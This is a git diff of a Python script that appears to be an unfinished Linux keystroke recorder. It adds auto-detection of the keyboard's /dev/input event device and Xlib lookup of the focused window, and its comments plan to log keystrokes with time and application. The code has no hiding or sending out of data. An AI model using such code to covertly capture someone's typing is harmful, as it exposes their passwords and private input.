@@ -19,7 +19,6 @@ values for timeval, type, code and value are located in /usr/include/linux/input
 
 #TODO: Look into the xlib module for getting current window in focus
 
-#TODO: Find way to auto-detect the /dev/input/? event file for keyboard
 #TODO: Add combination for Fn keys
 #TODO: When recording keystrokes add date/time of keystrokes and also the application that
 #      is currrently in focus
@@ -60,21 +59,51 @@ def key_code_to_ascii():
 
 ' Gets current state of caps lock and nums lock keys '
 def get_capsnum_lock():
+    #extracts status of caps/nums lock from 'xset -q'
     res_out = run_process(["xset", "-q"])
     res = re.sub("[0123456789 ]", "", res_out).split("\n")[3].split(":")
     return [res[2], res[4]]
 
 ' Gets current keyboard layout, e.g UK, US, etc. '
 def get_keyboard_layout():
+    #extracts keyboard layout from 'setxkbmap -query'
     layout_line = run_process(["setxkbmap", "-query"]).split("\n")[2].split(":")
     return layout_line[1].split(",")[0].strip()
 
-' Gets process of the window currrently in focus '
+''' Gets process of the window currrently in focus
+    :output window_name: name of window in focus
+    :output process_name: name of process for window in focus'''
 def get_focused_window():
-    #TODO: Look into pytohn Xlib library
-    pass
+    #TODO: Figure out how to find the process of the window in focus
+    #BUG: Certain applications returning None for wm_name
 
-' Runs and returns process output '
+    #connects to default display
+    display = Xlib.display.Display()
+
+    #gets current window in foucs
+    w = display.get_input_focus().focus
+    w_name, w_class = w.get_wm_name(), w.get_wm_class()
+    if not w_name or not w_class: w = w.query_tree().parent
+    if not w_name: w_name = w.get_wm_name()
+    if not w_class: w_class = w.get_wm_class()
+
+    #w_class = "{}:{}".format(w_class[0], w_class[1])
+    return (w_name, w_class)
+
+' Gets the device located at /dev/input/ that corresponds to the keyboard'
+def get_keyboard_event():
+    #/proc/bus/input/devices contains the name and attributes of connected devices
+    ps = run_process(["cat", "/proc/bus/input/devices"]).split("\n\n")
+
+    #extracts event used by keyboard from command output
+    for line in ps:
+        l = line.split("\n")
+        if len(l) != 11 or "keyboard" not in l[1]: continue
+        handlers = l[5][12:].strip().split(" ")
+        for h in handlers:
+            if "event" in h: return h
+
+' Runs and returns output of a command '
 def run_process(command):
     ps = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return ps.stdout.decode() if ps.stdout else ps.stderr.decode()
@@ -127,4 +156,6 @@ def main():
 
 if __name__ == '__main__':
     #main()
-    print(get_keyboard_layout())
+    while True:
+        print(get_focused_window())
+        time.sleep(5)
